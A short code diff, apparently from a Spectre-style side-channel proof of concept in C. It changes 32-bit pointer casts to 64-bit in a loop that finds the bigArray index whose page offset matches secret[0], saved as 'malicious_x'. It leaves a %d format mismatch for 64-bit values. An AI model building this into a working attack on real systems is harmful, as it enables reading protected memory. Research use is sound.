@@ -151,13 +151,13 @@ int main(int argc, const char * * argv) {
   for (i = 0; i < sizeof(bigArray); i++)
       bigArray[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 
-  uint32_t addressOfStartOfSecretModulo = (uint32_t)&secret[0] % 4096;
+  uint64_t addressOfStartOfSecretModulo = (uint64_t)&secret[0] % 4096;
 
   //Find the address that corresponds to secret[0] in terms of its modulu
   for (i = 0; i < sizeof(bigArray); i++) {
       addr = &bigArray[i];
-      printf("current is %d in iteration %d\n", (uint32_t)(addr) % 4096, i);
-      if ((uint32_t)(addr) % 4096 == addressOfStartOfSecretModulo) {
+      printf("current is %d in iteration %d\n", (uint64_t)(addr) % 4096, i);
+      if ((uint64_t)(addr) % 4096 == addressOfStartOfSecretModulo) {
           malicious_x = i; //This is the location that we need in bigArray
           break;
       }
